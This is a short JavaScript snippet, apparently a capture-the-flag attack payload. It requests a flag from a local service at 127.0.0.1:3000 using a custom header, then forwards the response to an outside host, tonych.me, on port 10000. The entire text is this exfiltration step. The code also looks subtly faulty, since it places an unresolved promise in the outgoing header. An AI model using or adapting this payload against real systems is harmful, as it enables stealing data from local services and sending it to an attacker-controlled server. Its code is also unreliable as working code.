fetch("http://127.0.0.1:3000/flag", { headers: { 'give-me-the-flag': 'yes' } })
    .then(r =>
        fetch("http://tonych.me:10000/api/data", { headers: { 'data': r.text() } })
    )